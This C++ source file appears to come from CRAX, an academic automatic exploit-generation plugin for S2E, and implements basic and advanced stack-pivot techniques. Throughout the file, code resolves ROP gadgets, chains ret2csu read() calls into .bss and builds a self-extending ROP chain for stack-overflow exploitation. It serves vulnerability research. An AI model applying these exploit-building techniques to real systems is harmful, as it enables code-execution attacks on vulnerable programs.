// Copyright 2021-2022 Software Quality Laboratory, NYCU.
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

#include <s2e/Plugins/CRAX/CRAX.h>
#include <s2e/Plugins/CRAX/Techniques/Ret2csu.h>
#include <s2e/Plugins/CRAX/Utils/StringUtil.h>

#include <cassert>
#include <memory>

#include "StackPivot.h"

using namespace klee;

namespace s2e::plugins::crax {

using RopSubchain = Technique::RopSubchain;

BasicStackPivot::BasicStackPivot(CRAX &ctx)
    : StackPivot(ctx) {
    resolveRequiredGadgets();
}


bool BasicStackPivot::checkRequirements() const {
    // XXX: check if ROP gadgets exist.
    return true;
}

void BasicStackPivot::resolveRequiredGadgets() {
    // Gadgets
    m_ctx.getExploit().registerSymbol("ret", m_ctx.getExploit().resolveGadget("ret"));
    m_ctx.getExploit().registerSymbol("pop_rbp_ret", m_ctx.getExploit().resolveGadget("pop rbp ; ret"));
    m_ctx.getExploit().registerSymbol("leave_ret", m_ctx.getExploit().resolveGadget("leave ; ret"));

    // Memory locations
    m_ctx.getExploit().registerSymbol("pivot_dest", m_ctx.getExploit().getElf().bss() + 0x800);
}


std::vector<RopSubchain> BasicStackPivot::getRopSubchains() const {
    Ret2csu *ret2csu = dynamic_cast<Ret2csu *>(Technique::s_mapper["Ret2csu"]);
    assert(ret2csu);

    // RBP
    RopSubchain part1 = {
        ConstantExpr::create(0, Expr::Int64)};

    // Write the 2nd stage ROP payload via read() to `pivot_dest`
    // via ret2csu(read, 0, pivot_dest, 1024).
    RopSubchain part2 = ret2csu->getRopSubchains(
        BaseOffsetExpr::create(m_ctx.getExploit(), "sym", "read"),
        ConstantExpr::create(0, Expr::Int64),
        BaseOffsetExpr::create(m_ctx.getExploit(), "", "pivot_dest"),
        ConstantExpr::create(1024, Expr::Int64))[0];

    // Perform stack pivoting.
    RopSubchain part3 = {
        BaseOffsetExpr::create(m_ctx.getExploit(), "", "pop_rbp_ret"),
        BaseOffsetExpr::create(m_ctx.getExploit(), "", "pivot_dest"),
        BaseOffsetExpr::create(m_ctx.getExploit(), "", "leave_ret")};

    RopSubchain ret;
    ret.reserve(part1.size() + part2.size() + part3.size());
    ret.insert(ret.end(), part1.begin(), part1.end());
    ret.insert(ret.end(), part2.begin(), part2.end());
    ret.insert(ret.end(), part3.begin(), part3.end());
    return {ret};
}

RopSubchain BasicStackPivot::getExtraRopSubchain() const {
    return { ConstantExpr::create(0, Expr::Int64) };  // rbp
}



AdvancedStackPivot::AdvancedStackPivot(CRAX &ctx)
    : StackPivot(ctx),
      m_offsetToRetAddr(),
      m_readCallSites() {
    resolveRequiredGadgets();

    ctx.beforeInstruction.connect(
            sigc::mem_fun(*this, &AdvancedStackPivot::maybeInterceptReadCallSites));

    ctx.beforeExploitGeneration.connect(
            sigc::mem_fun(*this, &AdvancedStackPivot::beforeExploitGeneration));
}


bool AdvancedStackPivot::checkRequirements() const {
    const auto &sym = m_ctx.getExploit().getElf().symbols();
    return sym.find("read") != sym.end() && m_readCallSites.size();
}

void AdvancedStackPivot::resolveRequiredGadgets() {
    // Gadgets
    m_ctx.getExploit().registerSymbol("pop_rsi_r15_ret", m_ctx.getExploit().resolveGadget("pop rsi ; pop r15 ; ret"));

    // Memory locations
    m_ctx.getExploit().registerSymbol("pivot_dest", m_ctx.getExploit().getElf().bss() + 0x800);
}


std::vector<RopSubchain> AdvancedStackPivot::getRopSubchains() const {
    assert(m_readCallSites.size() &&
           "AdvancedStackPivot requires at least one call site of read@libc");

    Ret2csu *ret2csu = dynamic_cast<Ret2csu *>(Technique::s_mapper["Ret2csu"]);
    assert(ret2csu && "Ret2csu object not found");

    // Resolve ret2LeaRbp.
    // XXX: from balsn: this is a good research topic.
    const auto &readCallSiteInfo = *m_readCallSites.rbegin();
    uint64_t ret2LeaRbp = determineRetAddr(readCallSiteInfo.address);

    // Return to a previous call site of read@libc.
    RopSubchain part1 = {
        ByteVectorExpr::create(std::vector<uint8_t>(m_offsetToRetAddr, 'A')),
        BaseOffsetExpr::create(m_ctx.getExploit(), "", "pivot_dest"),
        BaseOffsetExpr::create(m_ctx.getExploit(), "", std::to_string(ret2LeaRbp))};

    // Generate the payload which guides the weird machine back to the exploitable state.
    RopSubchain part2 = {
        ByteVectorExpr::create(std::vector<uint8_t>(m_offsetToRetAddr, 'A')),
        AddExpr::alloc(
                BaseOffsetExpr::create(m_ctx.getExploit(), "", "pivot_dest"),
                AddExpr::alloc(
                        ConstantExpr::create(8, Expr::Int64),
                        ConstantExpr::create(m_offsetToRetAddr, Expr::Int64))),
        BaseOffsetExpr::create(m_ctx.getExploit(), "", std::to_string(ret2LeaRbp))
    };

    // At this point, a stack-buffer overflow should take place inside libc,
    // and the weird machine shall not return from read@libc. Now we will
    // be able to perform ROP, but we don't have enough space to perform
    // a huge read() via ret2csu. So here we'll build a self-extending ROP chain
    // which continuously calls read@plt until there's enough space to perform
    // ret2csu once.
    RopSubchain part3;
    for (size_t i = 0; i < 6; i++) {
        ref<Expr> e0 = BaseOffsetExpr::create(m_ctx.getExploit(), "", "pop_rsi_r15_ret");
        ref<Expr> e1 = AddExpr::alloc(
                BaseOffsetExpr::create(m_ctx.getExploit(), "", "pivot_dest"),
                AddExpr::alloc(
                        ConstantExpr::create(8, Expr::Int64),
                        MulExpr::alloc(
                                ConstantExpr::create(0x30, Expr::Int64),
                                ConstantExpr::create(i + 1, Expr::Int64))));
        ref<Expr> e2 = ConstantExpr::create(0, Expr::Int64);
        ref<Expr> e3 = BaseOffsetExpr::create(m_ctx.getExploit(), "sym", "read");

        part3.push_back(e0);
        part3.push_back(e1);
        part3.push_back(e2);
        part3.push_back(e3);
    }

    // Now, we should have accumulated enough space to perform a huge read() via ret2csu.
    // read(0, pivot_dest + 0x30 * 7, 0x400).
    RopSubchain part4 = ret2csu->getRopSubchains(
            BaseOffsetExpr::create(m_ctx.getExploit(), "sym", "read"),
            ConstantExpr::create(0, Expr::Int64),
            AddExpr::alloc(
                    BaseOffsetExpr::create(m_ctx.getExploit(), "", "pivot_dest"),
                    MulExpr::alloc(
                            ConstantExpr::create(0x30, Expr::Int64),
                            ConstantExpr::create(7, Expr::Int64))),
            ConstantExpr::create(0x400, Expr::Int64))[0];

    while (part4.size() % 6) {
        part4.push_back(ConstantExpr::create(0, Expr::Int64));
    }


    std::vector<RopSubchain> ret = {part1, part2};
    for (size_t i = 0; i < part3.size(); i += 6) {
        ret.push_back(RopSubchain(part3.begin() + i, part3.begin() + i + 6));
    }
    for (size_t i = 0; i < part4.size(); i += 6) {
        ret.push_back(RopSubchain(part4.begin() + i, part4.begin() + i + 6));
    }
    return ret;
}


void AdvancedStackPivot::maybeInterceptReadCallSites(S2EExecutionState *state,
                                                     const Instruction &i) {
    if (m_ctx.isCallSiteOf(i.address, "read")) {
        uint64_t buf = m_ctx.reg().readConcrete(Register::X64::RSI);
        uint64_t len = m_ctx.reg().readConcrete(Register::X64::RDX);
        m_readCallSites.insert({i.address, buf, len});
    }
}

void AdvancedStackPivot::beforeExploitGeneration() {
    const auto &readCallSiteInfo = *m_readCallSites.rbegin();
    uint64_t rsp = m_ctx.reg().readConcrete(Register::X64::RSP);
    m_offsetToRetAddr = rsp - readCallSiteInfo.buf - 16;
}

uint64_t AdvancedStackPivot::determineRetAddr(uint64_t readCallSiteAddr) const {
    std::string symbol = m_ctx.getBelongingSymbol(readCallSiteAddr);
    log<WARN>() << hexval(readCallSiteAddr) << " is within " << symbol << "\n";

    std::vector<Instruction> insns = m_ctx.getDisassembler().disasm(symbol);
    uint64_t ret = 0;

    for (int i = insns.size() - 2; i >= 0; i--) {
        if (insns[i].opStr.find("rbp") != std::string::npos) {
            ret = insns[i].address;
            break;
        }
    }
    assert(ret && "determineReturnAddr(): no suitable candidates?");
    return ret - m_ctx.getExploit().getElf().getBase();
}

}  // namespace s2e::plugins::crax
